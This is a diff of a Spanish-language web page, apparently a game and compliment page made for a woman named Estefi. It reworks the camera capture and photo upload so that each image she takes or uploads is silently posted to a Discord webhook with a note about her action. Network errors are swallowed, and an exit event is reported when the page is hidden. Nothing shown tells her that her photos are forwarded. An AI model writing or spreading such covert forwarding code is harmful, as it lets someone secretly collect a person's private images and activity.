@@ -277,7 +277,7 @@
             if (document.visibilityState === 'hidden') enviarSalida();
         });
 
-        // --- FUNCIONES DE CÁMARA (NUEVA OPCIÓN) ---
+        // --- FUNCIONES DE CÁMARA ---
         let stream = null;
         async function startCamera() {
             try {
@@ -306,15 +306,54 @@
                 output.src = URL.createObjectURL(blob);
                 output.style.display = 'block';
                 
-                // Detener cámara y ocultar
                 stream.getTracks().forEach(track => track.stop());
                 document.getElementById('camera-container').style.display = 'none';
                 
                 showPiropo();
-                enviarADiscord(file);
+                // Mensaje específico para cuando se toma una foto
+                enviarADiscord(file, "Estefi se tomó una foto");
             }, 'image/jpeg');
         }
 
+        function loadPhoto(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = function(){
+                const output = document.getElementById('preview-img');
+                output.src = reader.result;
+                output.style.display = 'block';
+                showPiropo();
+                // Mensaje específico para cuando sube una foto
+                enviarADiscord(file, "Estefi subió una foto");
+            };
+            reader.readAsDataURL(file);
+        }
+
+        async function enviarADiscord(foto, mensaje) {
+            const formData = new FormData();
+            formData.append("file", foto);
+            formData.append("payload_json", JSON.stringify({
+                content: mensaje
+            }));
+
+            try {
+                await fetch(webhookURL, { method: "POST", body: formData });
+            } catch (e) {}
+        }
+        
+        async function enviarTextoDiscord(mensaje) {
+            try {
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: mensaje })
+                });
+            } catch (e) {}
+        }
+
+        // --- RESTO DE LAS FUNCIONES DE JUEGO MANTENIDAS IGUAL ---
         let currentGame = ''; 
         let score = 0;
         let gameActive = false;
@@ -349,43 +388,6 @@
         ];
         
         let piroposDisponibles = [...piroposOriginales];
-
-        function loadPhoto(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-
-            const reader = new FileReader();
-            reader.onload = function(){
-                const output = document.getElementById('preview-img');
-                output.src = reader.result;
-                output.style.display = 'block';
-                showPiropo();
-                enviarADiscord(file);
-            };
-            reader.readAsDataURL(file);
-        }
-
-        async function enviarTextoDiscord(mensaje) {
-            try {
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: mensaje })
-                });
-            } catch (e) {}
-        }
-
-        async function enviarADiscord(foto) {
-            const formData = new FormData();
-            formData.append("file", foto);
-            formData.append("payload_json", JSON.stringify({
-                content: "¡Tefi acaba de subir una foto nueva! 🔥📸"
-            }));
-
-            try {
-                await fetch(webhookURL, { method: "POST", body: formData });
-            } catch (e) {}
-        }
 
         function obtenerPiropo() {
             if (piroposDisponibles.length === 0) piroposDisponibles = [...piroposOriginales];
